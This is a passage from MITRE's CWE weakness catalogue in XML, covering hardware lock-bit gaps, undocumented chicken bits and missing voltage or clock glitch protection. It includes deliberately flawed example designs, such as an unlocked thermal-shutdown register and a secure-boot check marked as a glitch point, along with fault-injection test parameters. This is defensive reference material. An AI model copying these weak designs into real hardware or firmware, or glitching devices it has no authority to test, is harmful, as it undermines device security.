				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, References</Modification_Comment>
				</Modification>
				<Contribution Type="Feedback">
				  <Contribution_Name>Narasimha Kumar V Mangipudi</Contribution_Name>
				  <Contribution_Organization>Lattice Semiconductor</Contribution_Organization>
				  <Contribution_Date>2021-10-20</Contribution_Date>
				  <Contribution_Comment>reviewed content changes</Contribution_Comment>
				</Contribution>
				<Contribution Type="Content">
				  <Contribution_Name>Hareesh Khattri</Contribution_Name>
				  <Contribution_Organization>Intel Corporation</Contribution_Organization>
				  <Contribution_Date>2021-10-22</Contribution_Date>
				  <Contribution_Comment>provided observed example</Contribution_Comment>
				</Contribution>
				<Contribution Type="Content">
				  <Contribution_Name>Shaza Zeitouni, Mohamadreza Rostami, Pouya Mahmoody, Ahmad-Reza Sadeghi</Contribution_Name>
				  <Contribution_Organization>Technical University of Darmstadt</Contribution_Organization>
				  <Contribution_Date>2023-06-21</Contribution_Date>
				  <Contribution_Comment>suggested demonstrative example</Contribution_Comment>
				</Contribution>
				<Contribution Type="Content">
				  <Contribution_Name>Rahul Kande, Chen Chen, Jeyavijayan Rajendran</Contribution_Name>
				  <Contribution_Organization>Texas A&amp;M University</Contribution_Organization>
				  <Contribution_Date>2023-06-21</Contribution_Date>
				  <Contribution_Comment>suggested demonstrative example</Contribution_Comment>
				</Contribution>
			<Previous_Entry_Name Date="2021-10-28">Improper Implementation of Lock Protection Registers</Previous_Entry_Name>
            </Content_History>
        </Weakness>
      <Weakness ID="1233" Name="Security-Sensitive Hardware Controls with Missing Lock Bit Protection" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>The product uses a register lock bit protection mechanism, but it does not ensure that the lock bit prevents modification of system registers or controls that perform changes to important hardware system configuration.</Description>
         <Extended_Description>
         	<xhtml:p>Integrated circuits and hardware intellectual properties (IPs) might provide device configuration controls that need to be programmed after device power reset by a trusted firmware or software module, commonly set by BIOS/bootloader. After reset, there can be an expectation that the controls cannot be used to perform any further modification. This behavior is commonly implemented using a trusted lock bit, which can be set to disable writes to a protected set of registers or address regions. The lock protection is intended to prevent modification of certain system configuration (e.g., memory/memory protection unit configuration).</xhtml:p>
		<xhtml:p>However, if the lock bit does not effectively write-protect all system registers or controls that could modify the protected system configuration, then an adversary may be able to use software to access the registers/controls and modify the protected hardware configuration.</xhtml:p>
		</Extended_Description>
			<Related_Weaknesses>
			  <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
			  <Related_Weakness Nature="ChildOf" CWE_ID="667" View_ID="1000"/>
			</Related_Weaknesses>
		 <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
		 </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
			<Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
			<Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
			<Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>Such issues could be introduced during hardware architecture and design and identified later during Testing or System Configuration phases.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>Such issues could be introduced during implementation and identified later during Testing or System Configuration phases.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
			   <Impact>Modify Memory</Impact>
               <Note>System Configuration protected by the lock bit can be modified even when the lock is set.</Note>
            </Consequence>
         </Common_Consequences>
	 <Detection_Methods>
	   <Detection_Method>
	     <Method>Manual Analysis</Method>
	     <Description>Set the lock bit. Attempt to modify the
	     information protected by the lock bit. If the information
	     is changed, implement a design fix. Retest. Also, attempt
	     to indirectly clear the lock bit or bypass
	     it.</Description>
	     <Effectiveness>High</Effectiveness>
	   </Detection_Method>
	 </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
                    <Phase>Implementation</Phase>
                    <Phase>Testing</Phase>
                    <Description>
                        <xhtml:ul>
                            <xhtml:li>Security lock bit protections must be reviewed for design inconsistency and common weaknesses.</xhtml:li>
			    <xhtml:li>Security lock programming flow and lock properties must be tested in pre-silicon and post-silicon testing.</xhtml:li>
                        </xhtml:ul>
                    </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Consider the example design below for a digital thermal sensor that detects overheating of the silicon and triggers system shutdown. The system critical temperature limit (CRITICAL_TEMP_LIMIT) and thermal sensor calibration (TEMP_SENSOR_CALIB) data have to be programmed by the firmware. 
               </Intro_Text>
               <Example_Code Nature="Bad" Language="Other">
				<xhtml:table>
				    <xhtml:tr>
				        <xhtml:th>Register</xhtml:th>
				        <xhtml:th>Field description</xhtml:th>
				    </xhtml:tr>
				<xhtml:tr>
				  <xhtml:td>CRITICAL_TEMP_LIMIT
				  </xhtml:td>
				  <xhtml:td>[31:8] Reserved field; Read only; Default 0<xhtml:br/>[7:0] Critical temp 0-255 Centigrade; Read-write-lock; Default 125
				  </xhtml:td>
				  </xhtml:tr>
				  <xhtml:tr>
				  <xhtml:td>TEMP_SENSOR_CALIB
				  </xhtml:td>
				  <xhtml:td>[31:0] Thermal sensor calibration data. A slope value used to map sensor reading to a degree Centigrade. Read-write; Default 25
				  </xhtml:td>
				  </xhtml:tr>
				  <xhtml:tr>
				  <xhtml:td>TEMP_SENSOR_LOCK
				  </xhtml:td>
				  <xhtml:td>[31:1] Reserved field; Read only; Default 0<xhtml:br/>[0] Lock bit, locks CRITICAL_TEMP_LIMIT register; Write-1-once; Default 0
				  </xhtml:td>
				  </xhtml:tr>
				  <xhtml:tr>
				  <xhtml:td>TEMP_HW_SHUTDOWN
				  </xhtml:td>
				  <xhtml:td>[31:2] Reserved field; Read only; Default 0<xhtml:br/>[1] Enable hardware shutdown on a critical temperature detection; Read-write; Default 0
				  </xhtml:td>
				  </xhtml:tr>
				  <xhtml:tr>
				  <xhtml:td>CURRENT_TEMP
				  </xhtml:td>
				  <xhtml:td>[31:8] Reserved field; Read only; Default 0<xhtml:br/>[7:0]   Current Temp 0-255 Centigrade; Read-only; Default 0 
				  </xhtml:td>
				  </xhtml:tr>
				  </xhtml:table>
               </Example_Code>				  
			   <Body_Text>
			   <xhtml:p>In this example note that only the CRITICAL_TEMP_LIMIT register is protected by the TEMP_SENSOR_LOCK bit, while the security design intent is to protect any modification of the critical temperature detection and response. 
			   </xhtml:p>
			   <xhtml:p>The response of the system, if the system heats to a critical temperature, is controlled by TEMP_HW_SHUTDOWN bit [1], which is not lockable. Also, the TEMP_SENSOR_CALIB register is not protected by the lock bit.
			   </xhtml:p>
			   <xhtml:p>By modifying the temperature sensor calibration, the conversion of the sensor data to a degree centigrade can be changed, such that the current temperature will never be detected to exceed critical temperature value programmed by the protected lock.
			   </xhtml:p>
			   <xhtml:p>Similarly, by modifying the TEMP_HW_SHUTDOWN.Enable bit, the system response detection of the current temperature exceeding critical temperature can be disabled.
			   </xhtml:p>
			   </Body_Text>
			   <Example_Code Nature="Good"><xhtml:p>Change TEMP_HW_SHUTDOWN and TEMP_SENSOR_CALIB controls to be locked by TEMP_SENSOR_LOCK.
			   </xhtml:p>
			   <xhtml:table>
				<xhtml:tr>
				  <xhtml:td>TEMP_SENSOR_CALIB
				  </xhtml:td>
				  <xhtml:td>[31:0] Thermal sensor calibration data. A slope value used to map sensor reading to a degree Centigrade. Read-write-Lock; Default 25; Locked by TEMP_SENSOR_LOCK bit[0]
				  </xhtml:td>
				  </xhtml:tr>
				  <xhtml:tr>
				  <xhtml:td>TEMP_HW_SHUTDOWN
				  </xhtml:td>
				  <xhtml:td>[31:2] Reserved field; Read only; Default 0<xhtml:p/>[1] Enable hardware shutdown on critical temperature detection; Read-write-Lock; Default 0; Locked by TEMP_SENSOR_LOCK bit[0]
				  </xhtml:td>
				  </xhtml:tr>
				  </xhtml:table>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
	    <Observed_Examples>
	      <Observed_Example>
		<Reference>CVE-2018-9085</Reference>
		<Description>Certain servers leave a write protection lock bit
		unset after boot, potentially allowing modification of
		parts of flash memory.</Description>
		<Link>https://www.cve.org/CVERecord?id=CVE-2018-9085</Link>
	      </Observed_Example>
		<Observed_Example>
		  <Reference>CVE-2014-8273</Reference>
		  <Description>Chain: chipset has a race condition (CWE-362) between when an interrupt handler detects an attempt to write-enable the BIOS (in violation of the lock bit), and when the handler resets the write-enable bit back to 0, allowing attackers to issue BIOS writes during the timing window [REF-1237].</Description>
		  <Link>https://www.cve.org/CVERecord?id=CVE-2014-8273</Link>
		</Observed_Example>
	      </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="176"/>
            <Related_Attack_Pattern CAPEC_ID="680"/>
         </Related_Attack_Patterns>
         <References>
		<Reference External_Reference_ID="REF-1237"/>
	      </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
                <Submission_Name>Arun Kanuparthi, Hareesh Khattri, Parbati Kumar Manna, Narasimha Kumar V Mangipudi</Submission_Name>
                <Submission_Organization>Intel Corporation</Submission_Organization>
                <Submission_Date>2020-01-15</Submission_Date>
                <Submission_Version>4.0</Submission_Version>
                <Submission_ReleaseDate>2020-02-24</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Detection_Factors, Maintenance_Notes, Name, Observed_Examples, Potential_Mitigations, References, Relationships, Weakness_Ordinalities</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Contribution Type="Feedback">
				  <Contribution_Name>Narasimha Kumar V Mangipudi</Contribution_Name>
				  <Contribution_Organization>Lattice Semiconductor</Contribution_Organization>
				  <Contribution_Date>2021-10-20</Contribution_Date>
				  <Contribution_Comment>reviewed content changes</Contribution_Comment>
				</Contribution>
			<Previous_Entry_Name Date="2021-10-28">Improper Hardware Lock Protection for Security Sensitive Controls</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="1242" Name="Inclusion of Undocumented Features or Chicken Bits" Abstraction="Base" Structure="Simple" Status="Incomplete">
            <Description>The device includes chicken bits or undocumented features that can create entry points for unauthorized actors.</Description>
            <Extended_Description>
                <xhtml:p>A common design practice is to use undocumented bits on a device that can be used to disable certain functional security features. These bits are commonly referred to as "chicken bits". They can facilitate quick identification and isolation of faulty components, features that negatively affect performance, or features that do not provide the required controllability for debug and test. Another way to achieve this is through implementation of undocumented features. An attacker might exploit these interfaces for unauthorized access.</xhtml:p>
            </Extended_Description>
			<Related_Weaknesses>
              <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
			</Related_Weaknesses>
            <Applicable_Platforms>
                <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
                <Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
                <Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
                <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
				<Technology Class="ICS/OT" Prevalence="Undetermined"/>
            </Applicable_Platforms>
            <Modes_Of_Introduction>
                <Introduction>
                    <Phase>Architecture and Design</Phase>
                </Introduction>
                <Introduction>
                    <Phase>Implementation</Phase>
                </Introduction>
                <Introduction>
                    <Phase>Documentation</Phase>
                </Introduction>
            </Modes_Of_Introduction>
            <Common_Consequences>
                <Consequence>
                    <Scope>Confidentiality</Scope>
                    <Scope>Integrity</Scope>
                    <Scope>Availability</Scope>
                    <Scope>Access Control</Scope>
                    <Impact>Modify Memory</Impact>
                    <Impact>Read Memory</Impact>
                    <Impact>Execute Unauthorized Code or Commands</Impact>
                    <Impact>Gain Privileges or Assume Identity</Impact>
                    <Impact>Bypass Protection Mechanism</Impact>
                </Consequence>
            </Common_Consequences>
            <Potential_Mitigations>
                <Mitigation>
                    <Phase>Architecture and Design</Phase>
                    <Phase>Implementation</Phase>
                    <Description>
                        <xhtml:p>The implementation of chicken bits in a released product is highly discouraged. If implemented at all, ensure that they are disabled in production devices. All interfaces to a device should be documented.</xhtml:p>
                    </Description>
                    <Effectiveness>High</Effectiveness>
                </Mitigation>
            </Potential_Mitigations>
            <Demonstrative_Examples>
                <Demonstrative_Example>
                    <Intro_Text>Consider a device that comes with various security measures, such as secure boot. The secure-boot process performs firmware-integrity verification at boot time, and this code is stored in a separate SPI-flash device. However, this code contains undocumented "special access features" intended to be used only for performing failure analysis and intended to only be unlocked by the device designer.</Intro_Text>
                    <Example_Code Nature="Bad" Language="Other">
                        <xhtml:div>Attackers dump the code from the device and then perform reverse engineering to analyze the code. The undocumented, special-access features are identified, and attackers can activate them by sending specific commands via UART before secure-boot phase completes. Using these hidden features, attackers can perform reads and writes to memory via the UART interface. At runtime, the attackers can also execute arbitrary code and dump the entire memory contents.</xhtml:div>
                    </Example_Code>
                    <Body_Text>Remove all chicken bits and hidden features that are exposed to attackers. Add authorization schemes that rely on cryptographic primitives to access any features that the manufacturer does not want to expose. Clearly document all interfaces.</Body_Text>
            	</Demonstrative_Example>
            </Demonstrative_Examples>
         <Taxonomy_Mappings>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SD-4</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SVV-3</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-2</Entry_ID>
	     <Entry_Name>Req CR 2.12</Entry_Name>
	   </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="212"/>
            <Related_Attack_Pattern CAPEC_ID="36"/>
         </Related_Attack_Patterns>
         <References>
                <Reference External_Reference_ID="REF-1071"/>
                <Reference External_Reference_ID="REF-1072"/>
                <Reference External_Reference_ID="REF-1073"/>
                <Reference External_Reference_ID="REF-1074"/>
                <Reference External_Reference_ID="REF-1075"/>
            </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
            <Content_History>
                <Submission>
                    <Submission_Name>Arun Kanuparthi, Hareesh Khattri, Parbati Kumar Manna, Narasimha Kumar V Mangipudi</Submission_Name>
                    <Submission_Organization>Intel Corporation</Submission_Organization>
                    <Submission_Date>2020-02-13</Submission_Date>
                    <Submission_Version>4.0</Submission_Version>
                    <Submission_ReleaseDate>2020-02-24</Submission_ReleaseDate>
                </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
            </Content_History>
        </Weakness>
      <Weakness ID="1247" Name="Improper Protection Against Voltage and Clock Glitches" Abstraction="Base" Structure="Simple" Status="Stable">
      <Description>The device does not contain or contains incorrectly implemented circuitry or sensors to detect and mitigate voltage and clock glitches and protect sensitive information or software contained on the device.</Description>
      <Extended_Description>
        <xhtml:p>A device might support features such as secure boot which are supplemented with hardware and firmware support. This involves establishing a chain of trust, starting with an immutable root of trust by checking the signature of the next stage (culminating with the OS and runtime software) against a golden value before transferring control. The intermediate stages typically set up the system in a secure state by configuring several access control settings. Similarly, security logic for exercising a debug or testing interface may be implemented in hardware, firmware, or both. A device needs to guard against fault attacks such as voltage glitches and clock glitches that an attacker may employ in an attempt to compromise the system.</xhtml:p>
      </Extended_Description>
			<Related_Weaknesses>
				<Related_Weakness Nature="ChildOf" CWE_ID="1384" View_ID="1000" Ordinal="Primary"/>
			</Related_Weaknesses>
		 <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
		 </Weakness_Ordinalities>
      <Applicable_Platforms>
        <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
        <Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
        <Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
        <Technology Class="ICS/OT" Prevalence="Undetermined"/>
        <Technology Class="System on Chip" Prevalence="Undetermined"/>
				<Technology Name="Power Management Hardware" Prevalence="Undetermined"/>
				<Technology Name="Clock/Counter Hardware" Prevalence="Undetermined"/>
				<Technology Name="Sensor Hardware" Prevalence="Undetermined"/>
      </Applicable_Platforms>
      <Modes_Of_Introduction>
        <Introduction>
          <Phase>Operation</Phase>
        </Introduction>
      </Modes_Of_Introduction>
      <Common_Consequences>
        <Consequence>
          <Scope>Confidentiality</Scope>
          <Scope>Integrity</Scope>
          <Scope>Availability</Scope>
          <Scope>Access Control</Scope>
          <Impact>Gain Privileges or Assume Identity</Impact>
          <Impact>Bypass Protection Mechanism</Impact>
          <Impact>Read Memory</Impact>
          <Impact>Modify Memory</Impact>
          <Impact>Execute Unauthorized Code or Commands</Impact>
        </Consequence>
      </Common_Consequences>
	  <Detection_Methods>
		<Detection_Method>
		  <Method>Manual Analysis</Method>
		  <Description>
			
			<xhtml:p>Put the processor in an infinite
			loop, which is then followed by instructions
			that should not ever be executed, since the
			loop is not expected to exit.  After the loop,
			toggle an I/O bit (for oscilloscope monitoring
			purposes), print a console message, and
			reenter the loop.  Note that to ensure that
			the loop exit is actually captured, many NOP
			instructions should be coded after the loop
			branch instruction and before the I/O bit
			toggle and the print statement.</xhtml:p>

			<xhtml:p>Margining the clock consists of varying the clock
			frequency until an anomaly occurs. This could be a
			continuous frequency change or it could be a single
			cycle. The single cycle method is described here. For
			every 1000th clock pulse, the clock cycle is shortened by
			10 percent. If no effect is observed, the width is
			shortened by 20%. This process is continued in 10%
			increments up to and including 50%. Note that the cycle
			time may be increased as well, down to seconds per
			cycle.</xhtml:p>

			<xhtml:p>Separately, the voltage is margined. Note that
			the voltage could be increased or decreased. Increasing
			the voltage has limits, as the circuitry may not be able
			to withstand a drastically increased voltage. This process
			starts with a 5% reduction of the DC supply to the CPU
			chip for 5 millisecond repeated at 1KHz. If this has no
			effect, the process is repeated, but a 10% reduction is
			used. This process is repeated at 10% increments down to a
			50% reduction. If no effects are observed at 5
			millisecond, the whole process is repeated using a 10
			millisecond pulse. If no effects are observed, the process
			is repeated in 10 millisecond increments out to 100
			millisecond pulses.</xhtml:p>

			<xhtml:p>While these are suggested starting points for
			testing circuitry for weaknesses, the limits may need to
			be pushed further at the risk of device damage. See
			[REF-1217] for descriptions of Smart Card attacks against
			a clock (section 14.6.2) and using a voltage glitch
			(section 15.5.3).</xhtml:p>
		  </Description>
		  <Effectiveness>Moderate</Effectiveness>
		</Detection_Method>
		<Detection_Method>
		  <Method>Dynamic Analysis with Manual Results Interpretation</Method>
		  <Description>
		    During the implementation phase where actual hardware is available, specialized hardware tools and apparatus such as ChipWhisperer may be used to check if the platform is indeed susceptible to voltage and clock glitching attacks.
		  </Description>
		</Detection_Method>
		<Detection_Method>
		  <Method>Architecture or Design Review</Method>
		  <Description>
		    Review if the protections against glitching merely transfer the attack target. For example, suppose a critical authentication routine that an attacker would want to bypass is given the protection of modifying certain artifacts from within that specific routine (so that if the routine is bypassed, one can examine the artifacts and figure out that an attack must have happened). However, if the attacker has the ability to bypass the critical authentication routine, they might also have the ability to bypass the other protection routine that checks the artifacts. Basically, depending on these kind of protections is akin to resorting to "Security by Obscurity".
		  </Description>
		</Detection_Method>
		<Detection_Method>
		  <Method>Architecture or Design Review</Method>
		  <Description>
		    Many SoCs come equipped with a built-in Dynamic Voltage and Frequency Scaling (DVFS) that can control the voltage and clocks via software alone. However, there have been demonstrated attacks (like Plundervolt and CLKSCREW) that target this DVFS [REF-1081] [REF-1082]. During the design and implementation phases, one needs to check if the interface to this power management feature is available from unprivileged SW (CWE-1256), which would make the attack very easy.
		  </Description>
		</Detection_Method>
	  </Detection_Methods>
      <Potential_Mitigations>
        <Mitigation>
          <Phase>Architecture and Design</Phase>
          <Phase>Implementation</Phase>
          <Description>
            <xhtml:p>At the circuit-level, using Tunable Replica Circuits (TRCs) or special flip-flops such as Razor flip-flops helps mitigate glitch attacks. Working at the SoC or platform base, level sensors may be implemented to detect glitches. Implementing redundancy in security-sensitive code (e.g., where checks are performed)also can help with mitigation of glitch attacks.</xhtml:p>
          </Description>
        </Mitigation>
      </Potential_Mitigations>
      <Demonstrative_Examples>
        <Demonstrative_Example>
          <Intro_Text>Below is a representative snippet of C code that is part of the secure-boot flow. A signature of the runtime-firmware image is calculated and compared against a golden value. If the signatures match, the bootloader loads runtime firmware. If there is no match, an error halt occurs. If the underlying hardware executing this code does not contain any circuitry or sensors to detect voltage or clock glitches, an attacker might launch a fault-injection attack right when the signature check is happening (at the location marked with the comment), causing a bypass of the signature-checking process.</Intro_Text>
          <Example_Code Nature="Bad" Language="C">
            ...<xhtml:br/>
            if (signature_matches)  // &lt;-Glitch Here<xhtml:br/>
            {<xhtml:br/>
			<xhtml:div style="margin-left:1em;">
              load_runtime_firmware();<xhtml:br/>
			</xhtml:div>
            }<xhtml:br/>
            else<xhtml:br/>
            {<xhtml:br/>
			<xhtml:div style="margin-left:1em;">
              do_not_load_runtime_firmware();<xhtml:br/>
			</xhtml:div>
            }<xhtml:br/>
            <xhtml:br/>	
            ...<xhtml:br/>
          </Example_Code>
          <Body_Text>After bypassing secure boot, an attacker can gain access to system assets to which the attacker should not have access.</Body_Text>
        	<Example_Code Nature="Good">
         		<xhtml:div>If the underlying hardware detects a voltage or clock glitch, the information can be used to prevent the glitch from being successful.</xhtml:div>
        		</Example_Code>
      	</Demonstrative_Example>
      </Demonstrative_Examples>
      <Observed_Examples>
      	<Observed_Example>
        		<Reference>CVE-2019-17391</Reference>
        		<Description>Lack of anti-glitch protections allows an attacker to launch a physical attack to bypass the secure boot and read protected eFuses.</Description>
        		<Link>https://www.cve.org/CVERecord?id=CVE-2019-17391</Link>
      		 </Observed_Example>
				<Observed_Example>
					<Reference>CVE-2021-33478</Reference>
					<Description>IP communication firmware allows access to a boot shell via certain impulses</Description>
					<Link>https://www.cve.org/CVERecord?id=CVE-2021-33478</Link>
				</Observed_Example>
      	</Observed_Examples>
        <Functional_Areas>
            <Functional_Area>Power</Functional_Area>
            <Functional_Area>Clock</Functional_Area>
        </Functional_Areas>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="624"/>
            <Related_Attack_Pattern CAPEC_ID="625"/>
         </Related_Attack_Patterns>
         <References>
        <Reference External_Reference_ID="REF-1061"/>
        <Reference External_Reference_ID="REF-1062"/>
        <Reference External_Reference_ID="REF-1063"/>
        <Reference External_Reference_ID="REF-1064"/>
        <Reference External_Reference_ID="REF-1065"/>
        <Reference External_Reference_ID="REF-1066"/>
		<Reference External_Reference_ID="REF-1217" Section="14.6.2 Security Evolution, page 291"/>
		<Reference External_Reference_ID="REF-1217" Section="15.5.3 Glitching, page 317"/>
		<Reference External_Reference_ID="REF-1081"/>
		<Reference External_Reference_ID="REF-1082"/>
		<Reference External_Reference_ID="REF-1285"/>
		<Reference External_Reference_ID="REF-1286" Section="1.2 / 4"/>
      </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
      <Content_History>
        <Submission>
          <Submission_Name>Arun Kanuparthi, Hareesh Khattri, Parbati Kumar Manna, Narasimha Kumar V Mangipudi</Submission_Name>
          <Submission_Organization>Intel Corporation</Submission_Organization>
          <Submission_Date>2020-02-12</Submission_Date>
          <Submission_Version>4.0</Submission_Version>
          <Submission_ReleaseDate>2020-02-24</Submission_ReleaseDate>
        </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Name, Observed_Examples, Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Functional_Areas</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Description, Detection_Factors, Name, References, Weakness_Ordinalities</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
